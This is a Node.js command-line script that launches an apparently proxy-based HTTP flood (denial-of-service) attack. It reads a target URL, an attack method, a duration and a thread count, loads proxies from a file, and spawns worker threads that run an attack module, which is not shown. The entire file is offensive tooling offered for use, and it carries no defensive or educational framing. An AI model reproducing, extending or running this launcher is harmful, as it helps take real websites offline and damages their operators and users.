const fs = require('fs')
const { Command } = require('commander')

const log = require('./modules/logger')
const thread = require('./modules/threads')

var temp = `temp.json`
var proxy = `proxy.txt`

log.banner()

const program = new Command()

program.version('1.0.0')

program.option('-u, --url <link>', 'target url')
program.option('-m, --method <GET, POST>', 'attack method')
program.option('-t, --time <length>', 'attack time')
program.option('-r, --reqs <length>', 'req per proxy connection')
program.option('-th, --threads <length>', 'threads per attack')
program.option('-p, --parameters', 'list all parameters')

program.parse(process.argv)

if (program.parameters)
    return log.args()

if (!program.url || !program.method || !program.time || !program.reqs || !program.threads)
    return log.error('you lacked to define something, put -p or --parameters')

if (fs.existsSync(proxy)) {
    var proxies = fs.readFileSync(proxy, 'utf-8').match(/\S+/g)
    if (!proxies)
        return log.warn('u need proxies from make an attack!')
    else
        log.info(`loaded ${proxies.length} proxies.`)
} else
    return log.info('aborted, u need an proxy.txt')

if (fs.existsSync(temp))
    fs.unlinkSync(temp)

fs.writeFile(temp, `{ "method": "${program.method}", "url" : "${program.url}", "time": ${program.time}, "reqpproxy": ${program.reqs} }`, function (err) {
    if (err)
        return log.error('error on create temp.json.')

    for (var i = 0; i < program.threads; i++) {
        thread.CreateThread(`./modules/attack.js`)
    }

    log.success("Attack started!")
})